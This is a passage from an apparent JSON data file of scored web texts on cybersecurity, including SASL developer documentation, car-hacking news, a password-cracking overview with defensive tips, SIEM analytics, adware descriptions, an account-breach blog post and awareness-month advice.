documents with personal information before throwing them away or recycling them. How Outlook 2003 helps to protect you from phishing schemes For specific information on how Outlook 2003 helps to protect you from phishing schemes, see the article called Block suspicious messages and phishing schemes.",
        "prob": "tensor([[1.9957e-06, 1.0000e+00]])"
    },
    {
        "text": "Every now and then I get to talk with college-age students about social media and all the stuff going with privacy, identity, and security on the Internet (most recently at Smith College, my Alma Mater.) More often than not, I find that they really don't know too much about how to protect themselves from fraud, let alone how to construct online identities that won't hurt their job chances. Yet, the assumption continues among lazy adults that \"kids know it all\" about the Internet.... Well, finally, the Government and tech giants have realized the inanity of believing \"kids know it all\" and have teamed up in an new program that will teach kids not just how to handle cyber bullies, but also how to deal with online frauds and scam artists. Now, I'm not thrilled that this is coming out of the Department of Homeland Security, but, when I think about it, what goes on in our little machines on our desks or in our laps could impact the larger network of computers out there. We're never really alone with our machines, if you think about it. The program will be administered by the non-profit National Cyber Security Alliance, has a curriculum, and will send to the schools volunteers from companies such as EMC and Science Applications International Corp. Support will come from Symantec, Cisco, and Microsoft, to name a few of the companies involved. Apparently, one of the motivators for starting the program was the results of a study done by the Pew Internet and American Life Project which found that only 3 percent of state school curriculums instructed students on proper use of social networks and chat rooms. Yet schools are often giving assignments that require Internet use. I guess the assumption was that kids were getting taught *something* about the Internet at home. But think about it: how many of us have heard stories of parents who plop computers in kids' rooms, and then allow the kids to just close the bedroom door? How many of us have heard parents say how they want to \"spy\" on their kids' activities online, rather than find out how things work or what's going on in the greater world of life online? So, I'd hazard a guess that there are indeed bigtime security reasons that may go beyond \"identity theft\" and \"stalkers\" that have become reasons for the government to create a program like this to teach kids the things they're not getting taught anywhere else. Think about it.",
        "prob": "tensor([[2.0544e-06, 1.0000e+00]])"
    },
    {
        "text": "SASL provides developers of applications and shared libraries with mechanisms for authentication, data integrity-checking, and encryption. SASL enables the developer to code to a generic API. This approach avoids dependencies on specific mechanisms. SASL is particularly appropriate for applications that use the IMAP, SMTP, ACAP, and LDAP protocols, as these protocols all support SASL. SASL is described in RFC 2222. The SASL library is called libsasl. libsasl is a framework that allows properly written SASL consumer applications to use any SASL plug-ins that are available on the system. The term plug-in refers to objects that provide services for SASL. Plug-ins are external to libsasl. SASL plug-ins can be used for authentication and security, canonicalization of names, and lookup of auxiliary properties, such as passwords. Cryptographic algorithms are stored in plug-ins rather than in libsasl. libsasl provides an application programming interface (API) for consumer applications and libraries. A service provider interface (SPI) is provided for plug-ins to supply services to libsasl. libsasl is not aware of the network or the protocol. Accordingly, the application must take responsibility for sending and receiving data between the client and server. SASL uses two important identifiers for users. The authentication ID (authid) is the user ID for authenticating the user. The authentication ID grants the user access to a system. The authorization ID (userid) is used to check whether the user is allowed to use a particular option. The SASL client application and SASL server application negotiate a common SASL mechanism and security level. Typically, the SASL server application sends its list of acceptable authentication mechanisms to the client. The SASL client application can then decide which authentication mechanism best satisfies its requirements. After this point, the authentication takes place using the agreed–upon authentication mechanism as a series of client-server exchanges of the SASL supplied authentication data. This exchange continues until the authentication successfully completes, fails, or is aborted by the client or the server. In the process of authentication, the SASL authentication mechanism can negotiate a security layer. If a security layer is selected, that layer must be used for the duration of the SASL session. Client and server applications make calls to their local copies of libsasl through the SASL API. libsasl communicates with the SASL mechanisms through the SASL service provider interface (SPI). Security mechanism plug-ins provide security services to libsasl. Some typical functions that are provided by security mechanisms follow: Authentication on the client side Authentication on the server side Integrity, that is, checking that transmitted data is intact Confidentiality, that is, encrypting and decrypting transmitted data SSF, the security strength factor, indicates the strength of the SASL protection. If the mechanism supports a security layer, the client and server negotiate the SSF. The value of the SSF is based on the security properties that were specified before the SASL negotiation. If a non-zero SSF is negotiated, both client and server need to use the mechanism's security layer when the authentication has completed. SSF is represented by an integer with one of the following values: 0 – No protection. 1 – Integrity checking only. >1 – Supports authentication, integrity and confidentiality. The number represents the encryption key length. The confidentiality and integrity operations are performed by the security mechanism. libsasl coordinates these requests. In the negotiation, the SASL client selects the mechanism with the maximum SSF. However, the actual SASL mechanism that is chosen might subsequently negotiate a lower SSF. Applications communicate with libsasl through the libsasl API. libsasl can request additional information by means of callbacks that are registered by the application. Applications do not call plug-ins directly, only through libsasl. Plug-ins generally call the libsasl framework's plug-ins, which then call the application's callbacks. SASL plug-ins can also call the application directly, although the application does not know whether the call came from a plug-in or from libsasl. Callbacks are useful in multiple areas, as follows. libsasl can use callbacks to get information that is needed to complete authentication. libsasl consumer applications can use callbacks to change search paths for plug-ins and configuration data, to verify files, and to change various default behaviors. Servers can use callbacks to change authorization policies, to supply different password verification methods, and to get password change information. Clients and servers can use callbacks to specify the language for error messages. Applications register two sorts of callbacks: global and session. Additionally, libsasl defines a number of callback identifiers that are used to register for different sorts of callbacks. If a given type of callback is not registered, libsasl takes default action. Session callbacks override global callbacks. If a session callback is specified for a given ID, the global callback is not called for that session. Some callbacks must be global, because these callbacks occur outside of sessions. The following instances require global callbacks: Determination of search paths for plug-ins to load Verification of plug-ins Location of configuration data The logging of error messages Other global configuration of libsasl or its plug-ins A SASL callback can be registered with a NULL callback function for a given SASL callback ID. The NULL callback function indicates that the client is equipped to supply the needed data. All SASL callback IDs start with the prefix SASL_CB_. SASL provides the following callbacks for use by either a client or a server: Gets a SASL option. Options modify the behavior of libsasl(3LIB) and related plug-ins. Can be used by either a client or a server. The default SASL plug-in search paths depend on the architecture as follows: 32-bit SPARC architecture: /usr/lib/sasl 32-bit x86 architecture: /usr/lib/sasl 64-bit SPARC architecture: /usr/lib/sasl/sparcv9 x64 architecture: /usr/lib/sasl/amd64 SASL provides the following callbacks for use by clients only: SASL provides the following callbacks for use by servers only: Checks that an authenticated user is authorized to act on behalf of the specified user. If this callback is not registered, then the authenticated user and the user to be authorized must be the same. If these IDs are not the same, then the authentication fails. Use the server application to take care of nonstandard authorization policies. When the SASL library is first initialized, the server and client declare any necessary global callbacks. The global callbacks are available prior to and during the SASL sessions. Prior to initialization, callbacks perform such tasks as loading plug-ins, logging data, and reading configuration files. At the start of a SASL session, additional callbacks can be declared. Such callbacks can override global callbacks if necessary. libsasl uses a SASL connection context to maintain the state of each SASL session for both SASL clients and SASL servers. Each context can be used for only one authentication and security session at a time. The maintained state includes the following information: Connection information, such as service, naming and address information, and protocol flags Callbacks specific to the connection Security properties for negotiating the SASL SSF State of the authentication along with security layer information The following diagram shows steps in the SASL life cycle. The client actions are shown on the left of the diagram and the server actions on the right side. The arrows in the middle show interactions between the client and server over an external connection. The sections that follow illustrate the steps in the life cycle. When sasl_client_init() is run, the SASL client, the client's mechanisms and the client's canonicalization plug-in are loaded. Similarly, when sasl_server_init() is called, the SASL server, the server's mechanisms, the server's canonicalization plug-in, and the server's auxprop plug-in are loaded. After sasl_client_init() has been called, additional client plug–ins can be added by using sasl_client_add_plugin() and sasl_canonuser_add_plugin(). On the server side, after sasl_server_init() has been called, additional server plug–ins can be added through sasl_server_add_plugin(), sasl_canonuser_add_plugin(), and sasl_auxprop_add_plugin(). SASL mechanisms are provided in the Oracle Solaris software in the following directories according to the architecture: 32-bit SPARC architecture: /usr/lib/sasl 32-bit x86 architecture: /usr/lib/sasl 64-bit SPARC architecture: /usr/lib/sasl/sparcv9 x64 architecture: /usr/lib/sasl/amd64 The SASL_CB_GETPATH callback can be used to override the default location. At this point, any required global callbacks are set. SASL clients and servers might include the following callbacks: A SASL server might additionally include the SASL_CB_GETCONF callback. The server and client use establish the connection through the protocol. To use SASL for authentication, the server and client create SASL connection contexts by using sasl_server_new() and sasl_client_new() respectively. The SASL client and server can use sasl_setprop() to set properties that impose security restrictions on mechanisms. This approach enables a SASL consumer application to decide the minimum SSF, the maximum SSF, and the security properties for the specified SASL connection context. #define SASL_SEC_NOPLAINTEXT 0x0001 #define SASL_SEC_NOACTIVE 0x0002 #define SASL_SEC_NODICTIONARY 0x0004 #define SASL_SEC_FORWARD_SECRECY 0x0008 #define SASL_SEC_NOANONYMOUS 0x0010 #define SASL_SEC_PASS_CREDENTIALS 0x0020 #define SASL_SEC_MUTUAL_AUTH 0x0040 Authentication and a security layer can be provided by the client-server protocol or by some other mechanism that is external to libsasl. In such a case, sasl_setprop() can be used to set the external authentication ID or the external SSF. For example, consider the case in which the protocol uses SSL with client authentication to the server. In this case, the external authentication identity can be the client's subject name. The external SSF can be the key size. For the server, libsasl determines the available SASL mechanisms according to the security properties and the external SSF. The client obtains the available SASL mechanisms from the SASL server through the protocol. For a SASL server to create a SASL connection context, the server should call sasl_server_new(). An existing SASL connection context that is no longer in use can be reused. However, the following parameters might need to be reset: #define SASL_DEFUSERREALM 3 /* default realm passed to server_new or set with setprop */ #define SASL_IPLOCALPORT 8 /* iplocalport string passed to server_new */ #define SASL_IPREMOTEPORT 9 /* ipremoteport string passed to server_new */ #define SASL_SERVICE 12 /* service passed to sasl_*_new */ #define SASL_SERVERFQDN 13 /* serverFQDN passed to sasl_*_new */ You can modify any of the parameters to sasl_client_new() and sasl_server_new() except the callbacks and protocol flags. The server and client can also establish security policy and set connection specific parameters by using sasl_setprop() to specify the following properties: #define SASL_SSF_EXTERNAL 100 /* external SSF active (sasl_ssf_t *) */ #define SASL_SEC_PROPS 101 /* sasl_security_properties_t */ #define SASL_AUTH_EXTERNAL 102 /* external authentication ID (const char *) */ SASL_SSF_EXTERNAL – For setting the strength factor, that is, the number of bits in the key SASL_SEC_PROPS – For defining security policy SASL_AUTH_EXTERNAL – The external authentication ID The server can call sasl_listmech() to get a list of the available SASL mechanisms that satisfy the security policy. The client can generally get the list of available mechanisms from the server in a protocol-dependent way. The initialization of a SASL session is illustrated in the following diagram. In this diagram and subsequent diagrams, data checks after transmission over the protocol have been omitted for the sake of simplicity. Authentication takes a variable number of client and server steps depending on the security mechanism that is used. The SASL client calls sasl_client_start() with a list of security mechanisms to use. This list typically comes from the server. libsasl selects the best mechanism to use for this SASL session, according to the available mechanisms and the client's security policy. The client's security policy controls which mechanisms are permitted. The selected mechanism is returned by sasl_client_start(). Sometimes the security mechanism for the client sometimes needs additional information for authentication. For registered callbacks, libsasl calls the specified callback unless the callback function is NULL. If the callback function is NULL, libsasl returns SASL_INTERACT and a request for needed information. If SASL_INTERACT is returned, then sasl_client_start() should be called with the requested information. If sasl_client_start() returns SASL_CONTINUE or SASL_OK, the client should send the selected mechanism with any resulting authentication data to the server. If any other value is returned, an error has occurred. For example, no mechanism might be available. The server receives the mechanism that has been selected by the client, along with any authentication data. The server then calls sasl_server_start() to initialize the mechanism data for this session. sasl_server_start() also processes any authentication data. If sasl_server_start() returns SASL_CONTINUE or SASL_OK, the server sends authentication data. If sasl_server_start() returns any other value, an error has occurred such as an unacceptable mechanism or an authentication failure. The authentication must be aborted. The SASL context should be either freed or reused. This part of the authentication process is illustrated in the following diagram. If the server call to sasl_server_start() returns SASL_CONTINUE, the server continues to communicate with the client to get all the necessary authentication information. The number of subsequent steps depends on the mechanism. If needed, the client calls sasl_client_step() to process the authentication data from the server and to generate a reply. Similarly, the server can call sasl_server_step() to process the authentication from the client and to generate a reply in turn. This exchange continues until the authentication is complete or until an error has occurred. SASL_OK is returned to indicate that the authentication has successfully completed for the client or server. The SASL mechanism might still have additional data to send to the other side so the other side can complete authentication. When authentication has been achieved on both sides, the server and client can inquire about each other's properties. The following diagram shows the interactions between the server and client to transfer the additional authentication data. To check for a security layer, use the sasl_getprop(3SASL) function to see if the security strength factor (SSF) has a value that is greater than 0. If a security layer has been negotiated, the client and server must use the resulting SSF after successful authentication. Data is exchanged between the client and server in a similar fashion to authentication. sasl_encode() is applied to data before the data is sent by the protocol to the client or server. On the receiving end, data is decoded by sasl_decode(). If a security layer has not been negotiated, the SASL connection context is not needed. The context can then be disposed of or reused. A SASL connection context should only be freed when the session is not to be reused. sasl_dispose() frees the SASL connection context and all associated resources and mechanisms. The SASL connection contexts must be disposed before calling sasl_done(). sasl_done() is not responsible for releasing context resources for the SASL connection. See libsasl Cleanup. When a SASL session is freed, the associated mechanisms are informed that all state can be freed. A SASL session should only be freed when the session is not to be reused. Otherwise, the SASL state can be reused by another session. Both the client and server use sasl_dispose() to free the SASL connection context. This step releases all the resources in the SASL library and the plug-ins. The client and server call sasl_done() to release libsasl() resources and to unload all the SASL plug-ins. sasl_done() does not release SASL connection contexts. Note that if an application is both a SASL client and a SASL server, sasl_done() releases both the SASL client and SASL server resources. You cannot release the resources for just the client or the server. Libraries should not call sasl_done(). Applications should exercise caution when calling sasl_done() to avoid interference with any libraries that might be using libsasl.",
        "prob": "tensor([[2.0027e-06, 1.0000e+00]])"
    },
    {
        "text": "(Phys.org) -- Now that tiny computers and electronic communications systems are being designed into cars, hackers can look toward the car, like the PC, as potential roadkill. If cars are to become computers on wheels, a number of security experts are expanding their focus on car security systems and sources of security threats. U.S. computer scientists from California and Washington state have already identified ways in which computer worms and Trojans are carried over to automobiles. Conduits include onboard diagnostics systems, wireless connections and even tainted CDs played on radios systems. Experts point out that the numerous computers known as electronic control units, or ECUs, require tens of millions of lines of computer code to manage interconnected systems. These range from engines, brakes and navigation to lighting, ventilation and entertainment. The same wireless technologies that power cell phones and Bluetooth headsets are in cars and in turn are vulnerable to remote attacks. Unlike PCs, though, the attackers goal with cars may not be to rob the victim of information but to steal the car, or spy on in-car conversation, or cause the vehicle to crash. McAfee, a subsidiary of Intel and known for its security work to remedy PC viruses, are conducting research on car security at a Beaverton, Oregon garage. Bruce Snell, a McAfee executive, confirmed that automakers are not blind to risks of cyber attacks and are aware of auto system-hacking repercussions far different from seeing laptop data swiped and wiped. McAfee, a subsidiary of Intel, issued a report on automotive systems security with a title that reveals what it sees as the coming risks: Caution: Malware Ahead. Researchers of the University of California, San Diego, and the University of Washington have already figured out how to hack into a modern car using a laptop. The same research team extended the scenario to remotely mount attacks via Bluetooth. According to the McAfee paper, another attack scenario was presented by researchers of the University of South Carolina and Rutgers. They demonstrated it was possible to mount an attack on a vehicle and compromise passengers privacy by tracking Radio Frequency Identification (RFID )tags using long-distance readers at around 40 meters; the RFID tags are used in tires for sensor data over wireless short-distance communication to the vehicle. Reports do not single out vendors because the issues are relevant to the entire industry; automakers use common suppliers and processes. Nonetheless, a Reuters check of vendor initiatives shows concern in responses. Major U.S. automakers did not say if they knew of any instances in which their vehicles had been attacked with malicious software or if they had recalled cars to fix security vulnerabilities. At the same time, nothing is impossible and they are working to keep their systems as safe as possible. Ford has its security engineers working on SYNC in-vehicle communications and entertainment system to ensure it is as resistant as possible to attack, according to the Reuters report. Toyota Motor Corp, the world's biggest automaker, said it was not aware of any hacking incidents and that hacking was at least close to impossible. A Toyota source said the vehicles are designed to change their coding constantly. Chrysler is joining industry groups and outside organizations to tackle car security. As noted in Car and Driver, as more people start to access car networks, the auto industry will beef up relevant security. That may also mean something all too familiar to the PC industry, a relentless skirmish between hackers and automakers. Explore further: Tech companies eye security that goes beyond passwords",
        "prob": "tensor([[2.0700e-06, 1.0000e+00]])"
    },
    {
        "text": "-: Password Hacking :- Password cracking is the process of recovering secret passwords from data that has been stored in or transmitted by a computer system. A common approach is to repeatedly try guesses for the password. Most passwords can be cracked by using following techniques : 1) Hashing :- Here we will refer to the one way function (which may be either an encryption function or cryptographic hash) employed as a hash and its output as a hashed password. If a system uses a reversible function to obscure stored passwords, exploiting that weakness can recover even 'well-chosen' passwords. One example is the LM hash that Microsoft Windows uses by default to store user passwords that are less than 15 characters in length. LM hash breaks the password into two 7-character fields which are then hashed separately, allowing each half to be attacked separately. ||Hash functions like SHA-512, SHA-1, and MD5 are considered impossible to invert when used correctly.| 2) Guessing :- Many passwords can be guessed either by humans or by sophisticated cracking programs armed with dictionaries (dictionary based) and the user's personal Not surprisingly, many users choose weak passwords, usually one related to themselves in some way. Repeated research over some 40 years has demonstrated that around 40% of user-chosen passwords are readily guessable by programs. Examples of insecure choices * blank (none) * the word \"password\", \"passcode\", \"admin\" and their derivatives * the user's name or login name * the name of their significant other or another person (loved one) * their birthplace or date of birth * a pet's name * a dictionary word in any language * automobile licence plate number * a row of letters from a standard keyboard layout (eg, the qwerty keyboard -- qwerty itself, asdf, or qwertyuiop) * a simple modification of one of the preceding, such as suffixing a digit or reversing the order of the letters. and so on.... In one survery of MySpace passwords which had been phished, 3.8 percent of passwords were a single word found in a dictionary, and another 12 percent were a word plus a final digit; two-thirds of the time that digit was. ||A password containing both uppercase & lowercase characters, numbers and special characters too; is a strong password and can never 3) Default Passwords :- A moderately high number of local and online applications have inbuilt default passwords that have been configured by programmers during development stages of software. There are lots of applications running on the internet on which default passwords are enabled. So, it is quite easy for an attacker to enter default password and gain access to sensitive information. A list containing default passwords of some of the most popular applications is available on the internet. ||Always disable or change the applications' (both online and offline) default username-password 4) Brute Force :- If all other techniques failed, then attackers uses brute force password cracking technique. Here an automatic tool is used which tries all possible combinations of available keys on the keyboard. As soon as correct password is reached it displays on the screen.This techniques takes extremely long time to complete, but password will ||Long is the password, large is the time taken to brute force it. 5) Phishing :- This is the most effective and easily executable password cracking technique which is generally used to crack the passwords of e-mail accounts, and all those accounts where secret information or sensitive personal information is stored by user such as social networking websites, matrimonial websites, etc. Phishing is a technique in which the attacker creates the fake login screen and send it to the victim, hoping that the victim gets fooled into entering the account username and password. As soon as victim click on \"enter\" or \"login\" login button this information reaches to the attacker using scripts or online form processors while the user(victim) is redirected to home page of e-mail service provider. ||Never give reply to the messages which are demanding for your username-password, urging to be e-mail service provider. It is possible to try to obtain the passwords through other different methods, such as social engineering, wiretapping, keystroke logging, login spoofing, dumpster diving, phishing, shoulder surfing, timing attack, acoustic cryptanalysis, using a Trojan Horse or virus, identity management system attacks (such as abuse of Self-service password reset) and compromising host security. However, cracking usually designates a guessing attack.",
        "prob": "tensor([[0.0521, 0.9479]])"
    },
    {
        "text": "During a speech in June 2012, Jonathan Evans, the chief of the UK’s home security agency MI5, stated that it was “fighting 'astonishing' levels of cyber-attacks”. The worry is not just about the number, but the sophistication and the degree of targeting of individual people and organisations. This is making it harder and harder to detect and stop such attacks with conventional cyber security defences. As a consequence, many are evaluating advanced tools that supplement point security products such as anti-virus, firewalls and intrusion prevention systems (IPS). This includes deploying what some are calling advanced security intelligence (ASI). ASI is the ability to look at a wide range of information sources in real time and spot that something anomalous is going on; this could be an attack or dangerous or undesirable user behaviour, another risk that needs to be mitigated. ASI builds on existing technology such as log management and SIEM (security information and event management) tools. The vendors involved, which include LogRhythm, IBM (via its Q1 Labs acquisition) and McAfee (via its Nitro Security acquisition), are souping their products up, in particular their SIEM tools, to provide ASI capabilities. Some are using the term NG-SIEM (next generation SIEM). Here are some examples of where ASI may succeed where point security products have failed: - Signature-based anti-virus software cannot detect new malware (zero-day) attacks. However, using ASI to correlate server activity logs could identify that a given server is being used to contact many other end-points on a given private network and is sending messages out to an unusual IP address (probably a command and control server). The recent Flame malware worked in a similar way to this. ASI would have been one way of detecting such an attack in advance (others are pointed out in a recent article by Quocirca). - An intrusion prevention system (IPS) may prevent multiple failed attempts to access a server from a particular bad IP address, but may not see that data is already being copied from that server due to a single successful penetration that was well enough disguised. Correlating log and event files could identify that two such events are related and lead to the prevention of a data theft. A so-called advanced persistent threat (APT) could have this sort of profile. - It may be normal for a known user to access a given application remotely and out of office hours, but not if the request is coming from a location where they cannot physically be located. Correlating each access request against the previous successful access request and checking the geographic location of the devices used can identify a physically impossible event such as a user having moved from London to Paris in the space a few minutes or hours, even if the bona fide user’s job role could see them legitimately in both locations. - It might be usual for an employee to access customer information; it may also be usual for them to download such data to a file for reporting reasons. However, for them to copy the data to a non-compliant location, for example a cloud storage resource in a certain country, should raise an alarm. There may be no malicious intent here; perhaps this is an example of a line-of-business commissioning its own cloud resources (an increasingly common practice). This requires rules that understand user access rights and compliance rules and the ability to correlate these in real time with attempts to copy data and the location of the target storage service. ASI tools can make use of many sources of IT intelligence data in real time. They also have central policy engines which allow customers to write their own rules as well as including a wide range of out-of-the-box rules (e.g. flagging suspicious activity, such as multiple machines simultaneously attempting connections to unauthorised IP addresses outside of a given network). For businesses, there is no end to the struggle to get the upper hand over cyber-criminals. For governments, the situation is arguably even worse, as cyber-space becomes the 5th theatre for warfare (after land, sea, air and space) and terrorists see cyber-space as a way to go after critical infrastructure. All have to keep upping the ante, to avoid falling too far behind, or perhaps even get ahead, turning cyber security into an offensive rather than defensive act. Quocirca’s report Advanced Cyber Security Intelligence is freely available here.",
        "prob": "tensor([[2.0442e-06, 1.0000e+00]])"
    },
    {
        "text": "Welcome to the Virus Encyclopedia of Panda Security. SysinternalsAntivirus is an adware program which attempts to deceive users by using a known name to be called, like Sysinternals, whose owner is Microsoft. SysinternalsAntivirus warns users of unexisting threats in their computers so that they purchase a certain program that removes them from the computer. Additionally, it prevents users from working with the computer, as it blocks the execution of the files with an EXE extension, displaying a message informing them that these files are infected. SysinternalsAntivirus can reach the computer when the user accesses certain websites which display banners or pop-up windows which lead to the download of this program. It can also reach the computer in a link that can be received via spam messages, fraudulent websites, etc. SysinternalsAntivirus is easy to recognize, as it shows the symptoms below: - It reaches the computer in a file with the following icon: - When it is run and installed, the interface of the program is displayed and starts scanning the system in search for possible malware: - Once finished, it displays a warning message informing users that the program has found several infected programs and documents in the computer:",
        "prob": "tensor([[2.9967e-05, 9.9997e-01]])"
    },
    {
        "text": "There are rarely talks about security breaches and problems that did or could result from those breaches in the public. The reason for that are simple, it is often embarrassing for the owner of the compromised account to admit the breach and for the solution provider to get possible flaws exposed that could result into a loss in confidence by existing or future clients into the safety of the clients data that were entrusted to the provider. The fact is that there is in most cases no reason for embarrassment, if the account owner and the solution provider did everything they could to prevent breaches in the security to the extent that is justifiable and practical considering the type of data that need to be protected and the possible consequences for the involved parties if a breach does occur. Of course are breaches because of disregard of fundamental does and don’ts embarrassing and not worth to be the subject of a public debate. I am referring to things like the use of “guessable passwords”, such as “password”, “master”, “root” or the first name of the child of the account owner or the fact that factory/system default passwords were not changed, even though the owner was aware of the existence of such things. Also the deployment of fundamental security measures such as firewalls, anti-virus and anti-spyware, proper encryption of data and communication between server and clients and the deployment of the latest security updates to the software that is used on any side, the users and the software provider’s side. There is NO such Thing as 100% Secure Even if you do anything right, does it not mean that you are 100% safe and invincible against security attacks, that are targeted or untargeted. You would be a fool who is disconnected from reality if you would believe that. There is no 100% security! Most security relies on the fact that the amount of time and resources necessary to breach the security does it not make worthwhile for an attacker to attempt to break the security of a system or account. If the benefits or gain of breaking into a system or account are worth less than what it takes to actually do it, most attackers are compelled and your system can be considered pretty much safe. The problem is always the type of attackers who don’t want to gain anything but the exploitation and detection of security holes in systems they choose to attack. Those folks are commonly referred to as ethical hackers or “white hat”; because they help companies to make their systems more secure and improve on the implementation of the right security precautions. Having a Plan If the Unlikely Does Happen Since nobody can ensure 100% security, is it vital to have a plan and process in place and ready to deploy in the event that a breach does happen. I am always amazed (in a bad sense) to learn that even large companies fail in this respect and do not have plans or procedure to follow in case the unlikely but possible event does actually happen. Google seems to be one of those companies who fail to have a plan for such events. This is disturbing to me, because Google increased their efforts to consolidate and integrate the accounts of their various services into as few accounts as possible and eventually into a single master account that allows access to everything, from AdSense to YouTube. Real World (BAD) Example How do I know this? Well, I experienced the unlikely event myself with a personal YouTube account, which I did not link to any of my Google accounts yet, except for a one-way connection to my Google AdSense account. The account is not critical to me (thank god) and also does not expose much access to personal data due to the way how I use the account and the fact that I did not link it to a Google account that would enable the attacker to access data that are critical to me. How the breach happened is still uncertain. I never exposed my user credentials anywhere, my password was not guessable, and I run anti-spyware and anti-virus software and keep them up-to-date. All latest security updates for the operating system and browsers used are installed. Does this exclude the possibility that the attacker was able to exploit vulnerability on my side to be able to break into my YouYube account? No, it does not. The attacker locked me out of my account by changing the password to something else and the email address behind the account to a throw away Yahoo! email. It does not seem to be a targeted attack, in a sense that somebody wanted to gain access to my account in particular. What the attacker wants with my account is also not clear. He logged into the account only twice so far and relatively little was changed in my account. I became aware of a problem with the account on January 3, 2008, contacted YouTube support on January 4, 2008 and realized after the initial response another day later on January 5, 2008 that my account was compromised. I immediately responded to make YouTube aware of this fact as well as provided as many information I could to a) establish that I am the rightful owner of the account, b) contact details to check my claims even further and to have something in their hands against me, if I would just be a prankster who makes wrong claims. I also suggested blocking access to the account to prevent any further damage to the content and allow further exploitation of the unlawful access to the account. I also wanted to make sure that any abuse of the account that could get me or Google into trouble will be possible, such as using the account to publish illegal content. The account was not blocked. I noticed that a login to the account occurred again 4 days later on January 9, 2008. I sent another email to YouTube without getting a response. This became a troublesome pattern, because response of support declined since I raised the bar by claiming a security breach. I was going to the extent to submit another support request via their web form to get a new ticket number. I referred to the existing ticket number in that request. I also used the “report background graphic” form to raise additional awareness of the problem. I used the only direct phone number I had at Google support, the service number for Google Apps, where I am a paying customer to get a hold of somebody and to reinforce my claims, plus provide additional identifiable information about by identity. After that phone call I did get an email from the Google Apps support team, requesting additional details in writing to back up my story. I responded with the requested information and again stopped hearing back from anybody. That was on January 9, 2008. I wrote a long and nasty email (without swearing, I promise) to several email addresses at Google and YouTube, including YouTube and Google support, YouTube and Google Security and Google Feedback on January 11, 2008. Only the email to Google support bounced. I did receive an email on the next day, with the request to provide 5 things to identify my rightful ownership of the account. I did this already directly or indirectly prior to that, but I did not complain and provided the requested things in the order and format they wanted. This was on January 13, 2008. I sent an email to support again today, asking about the status. I received an email four and a half hour later, that acknowledged that my account appears to have been compromised and the new password for the account. They also suggested that I should update the email address back to an account under my control. This is a multiple step process where the attacker was given the opportunity to gain control of the account again. If the attacker would have tried to login to my account again and noticed that the password he set does not work anymore, he could have simply used the “forgot password” form to retrieve the new password and then change it again. Fortunately did this not happen and I was able to gain control over my account again, 12 days after the breach occurred and 11 days after YouTube was notified about the breach. Boy, I am glad that I did not link my YouTube account to my Google account yet and I also do not plan to do so, until I was reassured that the cause for the breach was determined and that the hole was closed. I offered my assistance to the YouTube/Google team to investigate the incident and to determine where and how the breach happened. I also hope that this incident and how it was handled will trigger a review or instatement of procedures that deal with those kinds of problems. This becomes even more critical when it comes to security breaches of users Google accounts where the breach can have much greater and severe consequences. The amount of damage possible, if your Google account was hijacked and if you use several of Google’s services under that account, is exponentially greater than the damage possible, if the breach is isolated to only one of the Google services. Take Away and the Lesson to be Learned This incident also serves as an example to other companies of how NOT to handle such things and a reminder to double check to double check if and what type of procedure you have in place in case the unlikely does happen. This addresses especially those of you who are responsible for those things in one way or another and are unaware of such procedures. This includes executive level employees and others with a stake in the company who are not directly involved with the security of their companies services. It does not hurt to ask what the plan is if a breach gets reported. If you don’t have plans, you better start working on one, rather sooner than later, before it is too late. Internet Marketer and Entrepreneur, owner and editor of the internet marketing resources portal at Cumbrowski.com",
        "prob": "tensor([[2.0387e-06, 1.0000e+00]])"
    },
    {
        "text": "Cyber security is a concern and a necessity at all levels. Computers and networks operated by governments, businesses, academia and other associations and agencies have been prime targets of cyber attack, but the number and rate of attacks on privately owned personal computers and smart devices has become explosively endemic. While cyber security and safety is a responsibility of all computer and smart device users, the federal government along with a variety of private and public partners has promoted “National Cyber Security Awareness Month” (NCSAM) for many years. Traditionally, the president of the United States had inaugurated NCSAM with a presidential declaration calling on everyone to be aware of cyber security, and to take all appropriate precautions to secure their digital devices from attack. In October 2012, there will again be a national effort to encourage and promote cyber security. This year, the lead federal agency promoting Cyber Security Awareness Month will be the Department of Homeland Security (DHS), which will be coordinating events and activities with the National Cyber Security Alliance (NCSA) and the Multi-State Information Sharing and Analysis Center (MS-ISAC). According to the DHS, this joint operation, “ ... encourages Americans to ACT – Achieve Cybersecurity Together – reflecting the interconnectedness of the modern world and the responsibility of each of us in securing cyberspace.” One might ask, “So what can I really do to help the cyber security effort?” The various agencies working together have come up with a list of actions and activities all computer and smart device users should implement. One of several behaviors encouraged by the alliance is to “Stop, Think, Connect” (stopthinkconnect.org). According to the alliance, all users should: “Stop: Before you use the Internet, take time to understand the risks and learn how to spot potential problems. Think: Take a moment to be certain the path ahead is clear. Watch for warning signs and consider how your actions online could impact your safety, or your family’s. Connect: Enjoy the Internet with greater confidence, knowing you’ve taken the right steps to safeguard yourself and your computer. Protect yourself and help keep the Web a safer place for everyone.”There are several definitive steps that users can take to implement and improve the security of their digital devices. According to a Microsoft Web page devoted to the National Cyber Security Awareness Month, there are six major practices that we should all accomplish in order to improve our cyber safety and security. Microsoft’s first recommendation is to defend your computer by strengthening your computer’s defenses, and not to be tricked into downloading malicious software. While these first recommendations may seem to be common sense for most computer users, these recommendations are also some of the least implemented. In order to defend our computers and other devices from attack, we need to keep all software (especially Web browsers) up to date; install legitimate and comprehensive security software and keep it current with the latest updates (most security publishers now push hourly or continuous updates); use and never turn off the firewall; be sure to have a hard-to-guess password on your router (and my urging to implement the highest level of encryption available on your wireless access point or device); and to use USB and other flash memory devices cautiously, as they have become a major vector for passing malware between computers and other devices. Microsoft also warns, “Think before you open attachments or click links in an e-mail message, an instant message (IM), or on a social network, even if you know the sender.” Much of the spam and malware being disseminated appears to come from someone we know, as their computers, instant messaging account, address books, or e-mail accounts have been hijacked and used to spread malware and spam to others, under the guise that it is OK because it is from someone you know. Another component of this second recommendation is to never click on links or buttons that appear in pop-up windows. Identity theft and related financial crimes has become a huge source of revenue for cyber crooks the world over, and Microsoft covers this in its second recommendation, “Protect Sensitive Information.” Microsoft warns users that before they enter any sensitive data on a Web site or online form, look for indications that the Web page is secure, such as the Web address beginning with “https” rather than “http,” and some indication from the browser that the connection is secure. Most browsers use a padlock (clearly open or closed) or some similar indication of a secure connection. Another common trick to steal personal information, such as usernames, passwords, banking and credit card information, and other personal information is commonly referred to as “phishing,” where identity thieves attempt to trick the user into disclosing personal information. Much of this phishing is by way of e-mails informing the user that their e-mail account will be locked unless they respond with their username and password; credit card companies, banks and other institutions asking for personal credit card or bank account information; offers of riches in exchange for helping some foreign official or widow to place investments in this country; foreign lottery winnings; and a variety of other scams. One of the latest common scams is known as “ransomware” where the user’s computer is locked, and a warning from the 